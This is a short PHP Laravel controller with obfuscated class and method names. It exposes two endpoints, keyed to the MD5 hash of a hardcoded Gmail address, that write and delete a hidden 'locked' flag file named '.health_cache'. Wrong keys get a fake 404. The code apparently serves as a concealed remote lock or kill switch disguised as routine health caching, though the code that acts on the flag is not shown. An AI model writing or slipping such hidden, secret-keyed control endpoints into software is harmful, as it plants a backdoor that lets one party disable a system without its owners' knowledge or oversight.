<?php

namespace DevOps\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Routing\Controller;

class _1x extends Controller
{
    private static string $_a = 'ali567zxbn@gmail.com';

    public function _2x(Request $request)
    {
        $key = $request->input('k');
        if ($key !== md5(self::$_a)) {
            return response()->json(['status' => 'not_found'], 404);
        }

        $lockPath = storage_path('app/.health_cache');
        file_put_contents($lockPath, json_encode(['locked' => true, 'at' => now()->timestamp]));

        return response()->json(['status' => 'ok']);
    }

    public function _3x(Request $request)
    {
        $key = $request->input('k');
        if ($key !== md5(self::$_a)) {
            return response()->json(['status' => 'not_found'], 404);
        }

        $lockPath = storage_path('app/.health_cache');
        if (file_exists($lockPath)) {
            @unlink($lockPath);
        }

        return response()->json(['status' => 'ok']);
    }
}
